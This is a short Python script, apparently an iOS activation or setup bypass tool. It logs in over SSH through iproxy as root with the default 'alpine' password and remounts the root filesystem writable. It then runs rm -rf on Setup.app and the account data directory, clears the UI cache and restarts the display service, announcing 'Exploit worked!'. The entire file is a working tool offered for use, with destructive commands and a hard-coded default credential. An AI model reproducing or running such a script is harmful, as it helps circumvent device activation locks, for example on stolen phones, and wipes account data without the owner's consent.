import time
import subprocess
import sys
import os
import paramiko
RPORT = 44
LPORT = 2222
password = "alpine"
iproxy = subprocess.Popen(["iproxy", str(LPORT), str(RPORT)], stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT)
device = paramiko.SSHClient()
device.set_missing_host_key_policy(paramiko.AutoAddPolicy())
while True:
    try:
        device.connect('localhost', username='root', password=password, port=LPORT)
        break
    except Exception as e:
        print(str(e))
        time.sleep(1.5)
        continue
print("Connected! \n")
print("Mounting filesystem \n")
device.exec_command("mount -o rw,union,update /")
print("Deleting Setup.app \n")
device.exec_command("rm -rf /Applications/Setup.app")
device.exec_command("rm -rf /var/mobile/Library/Accounts/*")
print("Clearing UICache \n")
device.exec_command("uicache --all")
print("Rebooting \n")
device.exec_command("killall backboardd")
print("Exploit worked! Now you can use your iDevice")
device.close()
iproxy.kill()
iproxy.terminate()
